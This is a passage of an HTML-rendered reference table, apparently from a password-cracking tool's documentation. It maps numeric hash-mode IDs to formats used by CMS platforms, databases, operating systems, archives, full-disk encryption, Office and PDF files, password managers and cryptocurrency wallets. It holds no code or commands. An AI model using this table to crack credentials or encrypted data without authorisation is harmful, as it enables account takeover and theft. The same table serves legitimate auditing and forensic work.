class="line">102</span></pre></td><td class="code"><pre><span class="line"> 2611 | vBulletin &lt; v3.8.5                               | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">103</span></pre></td><td class="code"><pre><span class="line"> 2711 | vBulletin &gt;&#x3D; v3.8.5                              | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">104</span></pre></td><td class="code"><pre><span class="line"> 2811 | MyBB 1.2+                                        | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">105</span></pre></td><td class="code"><pre><span class="line"> 2811 | IPB2+ (Invision Power Board)                     | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">106</span></pre></td><td class="code"><pre><span class="line"> 8400 | WBB3 (Woltlab Burning Board)                     | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">107</span></pre></td><td class="code"><pre><span class="line">   11 | Joomla &lt; 2.5.18                                  | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">108</span></pre></td><td class="code"><pre><span class="line">  400 | Joomla &gt;&#x3D; 2.5.18 (MD5)                           | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">109</span></pre></td><td class="code"><pre><span class="line">  400 | WordPress (MD5)                                  | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">110</span></pre></td><td class="code"><pre><span class="line"> 2612 | PHPS                                             | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">111</span></pre></td><td class="code"><pre><span class="line"> 7900 | Drupal7                                          | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">112</span></pre></td><td class="code"><pre><span class="line">   21 | osCommerce                                       | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">113</span></pre></td><td class="code"><pre><span class="line">   21 | xt:Commerce                                      | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">114</span></pre></td><td class="code"><pre><span class="line">11000 | PrestaShop                                       | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">115</span></pre></td><td class="code"><pre><span class="line">  124 | Django (SHA-1)                                   | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">116</span></pre></td><td class="code"><pre><span class="line">10000 | Django (PBKDF2-SHA256)                           | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">117</span></pre></td><td class="code"><pre><span class="line">16000 | Tripcode                                         | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">118</span></pre></td><td class="code"><pre><span class="line"> 3711 | MediaWiki B type                                 | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">119</span></pre></td><td class="code"><pre><span class="line">13900 | OpenCart                                         | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">120</span></pre></td><td class="code"><pre><span class="line"> 4521 | Redmine                                          | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">121</span></pre></td><td class="code"><pre><span class="line"> 4522 | PunBB                                            | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">122</span></pre></td><td class="code"><pre><span class="line">12001 | Atlassian (PBKDF2-HMAC-SHA1)                     | Forums, CMS, E-Commerce, Frameworks</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">123</span></pre></td><td class="code"><pre><span class="line">   12 | PostgreSQL                                       | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">124</span></pre></td><td class="code"><pre><span class="line">  131 | MSSQL (2000)                                     | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">125</span></pre></td><td class="code"><pre><span class="line">  132 | MSSQL (2005)                                     | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">126</span></pre></td><td class="code"><pre><span class="line"> 1731 | MSSQL (2012, 2014)                               | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">127</span></pre></td><td class="code"><pre><span class="line">  200 | MySQL323                                         | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">128</span></pre></td><td class="code"><pre><span class="line">  300 | MySQL4.1&#x2F;MySQL5                                  | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">129</span></pre></td><td class="code"><pre><span class="line"> 3100 | Oracle H: Type (Oracle 7+)                       | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">130</span></pre></td><td class="code"><pre><span class="line">  112 | Oracle S: Type (Oracle 11+)                      | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">131</span></pre></td><td class="code"><pre><span class="line">12300 | Oracle T: Type (Oracle 12+)                      | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">132</span></pre></td><td class="code"><pre><span class="line"> 8000 | Sybase ASE                                       | Database Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">133</span></pre></td><td class="code"><pre><span class="line">  141 | Episerver 6.x &lt; .NET 4                           | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">134</span></pre></td><td class="code"><pre><span class="line"> 1441 | Episerver 6.x &gt;&#x3D; .NET 4                          | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">135</span></pre></td><td class="code"><pre><span class="line"> 1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)            | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">136</span></pre></td><td class="code"><pre><span class="line">12600 | ColdFusion 10+                                   | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">137</span></pre></td><td class="code"><pre><span class="line"> 1421 | hMailServer                                      | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">138</span></pre></td><td class="code"><pre><span class="line">  101 | nsldap, SHA-1(Base64), Netscape LDAP SHA         | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">139</span></pre></td><td class="code"><pre><span class="line">  111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA      | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">140</span></pre></td><td class="code"><pre><span class="line"> 1411 | SSHA-256(Base64), LDAP &#123;SSHA256&#125;                 | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">141</span></pre></td><td class="code"><pre><span class="line"> 1711 | SSHA-512(Base64), LDAP &#123;SSHA512&#125;                 | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">142</span></pre></td><td class="code"><pre><span class="line">16400 | CRAM-MD5 Dovecot                                 | HTTP, SMTP, LDAP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">143</span></pre></td><td class="code"><pre><span class="line">15000 | FileZilla Server &gt;&#x3D; 0.9.55                       | FTP Server</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">144</span></pre></td><td class="code"><pre><span class="line">11500 | CRC32                                            | Checksums</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">145</span></pre></td><td class="code"><pre><span class="line"> 3000 | LM                                               | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">146</span></pre></td><td class="code"><pre><span class="line"> 1000 | NTLM                                             | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">147</span></pre></td><td class="code"><pre><span class="line"> 1100 | Domain Cached Credentials (DCC), MS Cache        | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">148</span></pre></td><td class="code"><pre><span class="line"> 2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2   | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">149</span></pre></td><td class="code"><pre><span class="line">15300 | DPAPI masterkey file v1                          | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">150</span></pre></td><td class="code"><pre><span class="line">15900 | DPAPI masterkey file v2                          | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">151</span></pre></td><td class="code"><pre><span class="line">12800 | MS-AzureSync  PBKDF2-HMAC-SHA256                 | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">152</span></pre></td><td class="code"><pre><span class="line"> 1500 | descrypt, DES (Unix), Traditional DES            | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">153</span></pre></td><td class="code"><pre><span class="line">12400 | BSDi Crypt, Extended DES                         | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">154</span></pre></td><td class="code"><pre><span class="line">  500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)        | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">155</span></pre></td><td class="code"><pre><span class="line"> 3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">156</span></pre></td><td class="code"><pre><span class="line"> 7400 | sha256crypt $5$, SHA256 (Unix)                   | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">157</span></pre></td><td class="code"><pre><span class="line"> 1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">158</span></pre></td><td class="code"><pre><span class="line">  122 | macOS v10.4, MacOS v10.5, MacOS v10.6            | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">159</span></pre></td><td class="code"><pre><span class="line"> 1722 | macOS v10.7                                      | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">160</span></pre></td><td class="code"><pre><span class="line"> 7100 | macOS v10.8+ (PBKDF2-SHA512)                     | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">161</span></pre></td><td class="code"><pre><span class="line"> 6300 | AIX &#123;smd5&#125;                                       | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">162</span></pre></td><td class="code"><pre><span class="line"> 6700 | AIX &#123;ssha1&#125;                                      | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">163</span></pre></td><td class="code"><pre><span class="line"> 6400 | AIX &#123;ssha256&#125;                                    | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">164</span></pre></td><td class="code"><pre><span class="line"> 6500 | AIX &#123;ssha512&#125;                                    | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">165</span></pre></td><td class="code"><pre><span class="line"> 2400 | Cisco-PIX MD5                                    | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">166</span></pre></td><td class="code"><pre><span class="line"> 2410 | Cisco-ASA MD5                                    | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">167</span></pre></td><td class="code"><pre><span class="line">  500 | Cisco-IOS $1$ (MD5)                              | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">168</span></pre></td><td class="code"><pre><span class="line"> 5700 | Cisco-IOS type 4 (SHA256)                        | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">169</span></pre></td><td class="code"><pre><span class="line"> 9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                    | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">170</span></pre></td><td class="code"><pre><span class="line"> 9300 | Cisco-IOS $9$ (scrypt)                           | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">171</span></pre></td><td class="code"><pre><span class="line">   22 | Juniper NetScreen&#x2F;SSG (ScreenOS)                 | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">172</span></pre></td><td class="code"><pre><span class="line">  501 | Juniper IVE                                      | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">173</span></pre></td><td class="code"><pre><span class="line">15100 | Juniper&#x2F;NetBSD sha1crypt                         | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">174</span></pre></td><td class="code"><pre><span class="line"> 7000 | FortiGate (FortiOS)                              | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">175</span></pre></td><td class="code"><pre><span class="line"> 5800 | Samsung Android Password&#x2F;PIN                     | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">176</span></pre></td><td class="code"><pre><span class="line">13800 | Windows Phone 8+ PIN&#x2F;password                    | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">177</span></pre></td><td class="code"><pre><span class="line"> 8100 | Citrix NetScaler                                 | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">178</span></pre></td><td class="code"><pre><span class="line"> 8500 | RACF                                             | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">179</span></pre></td><td class="code"><pre><span class="line"> 7200 | GRUB 2                                           | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">180</span></pre></td><td class="code"><pre><span class="line"> 9900 | Radmin2                                          | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">181</span></pre></td><td class="code"><pre><span class="line">  125 | ArubaOS                                          | Operating Systems</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">182</span></pre></td><td class="code"><pre><span class="line"> 7700 | SAP CODVN B (BCODE)                              | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">183</span></pre></td><td class="code"><pre><span class="line"> 7701 | SAP CODVN B (BCODE) via RFC_READ_TABLE           | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">184</span></pre></td><td class="code"><pre><span class="line"> 7800 | SAP CODVN F&#x2F;G (PASSCODE)                         | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">185</span></pre></td><td class="code"><pre><span class="line"> 7801 | SAP CODVN F&#x2F;G (PASSCODE) via RFC_READ_TABLE      | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">186</span></pre></td><td class="code"><pre><span class="line">10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1              | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">187</span></pre></td><td class="code"><pre><span class="line"> 8600 | Lotus Notes&#x2F;Domino 5                             | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">188</span></pre></td><td class="code"><pre><span class="line"> 8700 | Lotus Notes&#x2F;Domino 6                             | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">189</span></pre></td><td class="code"><pre><span class="line"> 9100 | Lotus Notes&#x2F;Domino 8                             | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">190</span></pre></td><td class="code"><pre><span class="line">  133 | PeopleSoft                                       | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">191</span></pre></td><td class="code"><pre><span class="line">13500 | PeopleSoft PS_TOKEN                              | Enterprise Application Software (EAS)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">192</span></pre></td><td class="code"><pre><span class="line">11600 | 7-Zip                                            | Archives</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">193</span></pre></td><td class="code"><pre><span class="line">12500 | RAR3-hp                                          | Archives</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">194</span></pre></td><td class="code"><pre><span class="line">13000 | RAR5                                             | Archives</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">195</span></pre></td><td class="code"><pre><span class="line">13200 | AxCrypt                                          | Archives</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">196</span></pre></td><td class="code"><pre><span class="line">13300 | AxCrypt in-memory SHA1                           | Archives</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">197</span></pre></td><td class="code"><pre><span class="line">13600 | WinZip                                           | Archives</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">198</span></pre></td><td class="code"><pre><span class="line">14700 | iTunes backup &lt; 10.0                             | Backup</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">199</span></pre></td><td class="code"><pre><span class="line">14800 | iTunes backup &gt;&#x3D; 10.0                            | Backup</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">200</span></pre></td><td class="code"><pre><span class="line"> 62XY | TrueCrypt                                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">201</span></pre></td><td class="code"><pre><span class="line">   X  | 1 &#x3D; PBKDF2-HMAC-RIPEMD160                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">202</span></pre></td><td class="code"><pre><span class="line">   X  | 2 &#x3D; PBKDF2-HMAC-SHA512                           | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">203</span></pre></td><td class="code"><pre><span class="line">   X  | 3 &#x3D; PBKDF2-HMAC-Whirlpool                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">204</span></pre></td><td class="code"><pre><span class="line">   X  | 4 &#x3D; PBKDF2-HMAC-RIPEMD160 + boot-mode            | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">205</span></pre></td><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure AES                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">206</span></pre></td><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Serpent                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">207</span></pre></td><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Twofish                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">208</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure AES                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">209</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Serpent                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">210</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Twofish                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">211</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded AES-Twofish            | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">212</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Serpent-AES            | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">213</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Twofish-Serpent        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">214</span></pre></td><td class="code"><pre><span class="line">    Y | 3 &#x3D; XTS 1536 bit all                             | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">215</span></pre></td><td class="code"><pre><span class="line"> 8800 | Android FDE &lt;&#x3D; 4.3                               | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">216</span></pre></td><td class="code"><pre><span class="line">12900 | Android FDE (Samsung DEK)                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">217</span></pre></td><td class="code"><pre><span class="line">12200 | eCryptfs                                         | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">218</span></pre></td><td class="code"><pre><span class="line">137XY | VeraCrypt                                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">219</span></pre></td><td class="code"><pre><span class="line">   X  | 1 &#x3D; PBKDF2-HMAC-RIPEMD160                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">220</span></pre></td><td class="code"><pre><span class="line">   X  | 2 &#x3D; PBKDF2-HMAC-SHA512                           | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">221</span></pre></td><td class="code"><pre><span class="line">   X  | 3 &#x3D; PBKDF2-HMAC-Whirlpool                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">222</span></pre></td><td class="code"><pre><span class="line">   X  | 4 &#x3D; PBKDF2-HMAC-RIPEMD160 + boot-mode            | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">223</span></pre></td><td class="code"><pre><span class="line">   X  | 5 &#x3D; PBKDF2-HMAC-SHA256                           | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">224</span></pre></td><td class="code"><pre><span class="line">   X  | 6 &#x3D; PBKDF2-HMAC-SHA256 + boot-mode               | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">225</span></pre></td><td class="code"><pre><span class="line">   X  | 7 &#x3D; PBKDF2-HMAC-Streebog-512                     | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">226</span></pre></td><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure AES                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">227</span></pre></td><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Serpent                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">228</span></pre></td><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Twofish                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">229</span></pre></td><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Camellia                   | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">230</span></pre></td><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Kuznyechik                 | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">231</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure AES                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">232</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Serpent                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">233</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Twofish                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">234</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Camellia                   | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">235</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Kuznyechik                 | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">236</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded AES-Twofish            | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">237</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Camellia-Kuznyechik    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">238</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Camellia-Serpent       | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">239</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Kuznyechik-AES         | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">240</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Kuznyechik-Twofish     | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">241</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Serpent-AES            | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">242</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Twofish-Serpent        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">243</span></pre></td><td class="code"><pre><span class="line">    Y | 3 &#x3D; XTS 1536 bit all                             | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">244</span></pre></td><td class="code"><pre><span class="line">14600 | LUKS                                             | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">245</span></pre></td><td class="code"><pre><span class="line">16700 | FileVault 2                                      | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">246</span></pre></td><td class="code"><pre><span class="line">18300 | Apple File System (APFS)                         | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">247</span></pre></td><td class="code"><pre><span class="line"> 9700 | MS Office &lt;&#x3D; 2003 $0&#x2F;$1, MD5 + RC4               | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">248</span></pre></td><td class="code"><pre><span class="line"> 9710 | MS Office &lt;&#x3D; 2003 $0&#x2F;$1, MD5 + RC4, collider #1  | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">249</span></pre></td><td class="code"><pre><span class="line"> 9720 | MS Office &lt;&#x3D; 2003 $0&#x2F;$1, MD5 + RC4, collider #2  | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">250</span></pre></td><td class="code"><pre><span class="line"> 9800 | MS Office &lt;&#x3D; 2003 $3&#x2F;$4, SHA1 + RC4              | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">251</span></pre></td><td class="code"><pre><span class="line"> 9810 | MS Office &lt;&#x3D; 2003 $3, SHA1 + RC4, collider #1    | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">252</span></pre></td><td class="code"><pre><span class="line"> 9820 | MS Office &lt;&#x3D; 2003 $3, SHA1 + RC4, collider #2    | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">253</span></pre></td><td class="code"><pre><span class="line"> 9400 | MS Office 2007                                   | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">254</span></pre></td><td class="code"><pre><span class="line"> 9500 | MS Office 2010                                   | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">255</span></pre></td><td class="code"><pre><span class="line"> 9600 | MS Office 2013                                   | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">256</span></pre></td><td class="code"><pre><span class="line">10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                    | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">257</span></pre></td><td class="code"><pre><span class="line">10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1       | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">258</span></pre></td><td class="code"><pre><span class="line">10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2       | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">259</span></pre></td><td class="code"><pre><span class="line">10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                    | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">260</span></pre></td><td class="code"><pre><span class="line">10600 | PDF 1.7 Level 3 (Acrobat 9)                      | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">261</span></pre></td><td class="code"><pre><span class="line">10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">262</span></pre></td><td class="code"><pre><span class="line">16200 | Apple Secure Notes                               | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">263</span></pre></td><td class="code"><pre><span class="line"> 9000 | Password Safe v2                                 | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">264</span></pre></td><td class="code"><pre><span class="line"> 5200 | Password Safe v3                                 | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">265</span></pre></td><td class="code"><pre><span class="line"> 6800 | LastPass + LastPass sniffed                      | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">266</span></pre></td><td class="code"><pre><span class="line"> 6600 | 1Password, agilekeychain                         | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">267</span></pre></td><td class="code"><pre><span class="line"> 8200 | 1Password, cloudkeychain                         | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">268</span></pre></td><td class="code"><pre><span class="line">11300 | Bitcoin&#x2F;Litecoin wallet.dat                      | Password Managers</span></pre></td></tr><tr><td 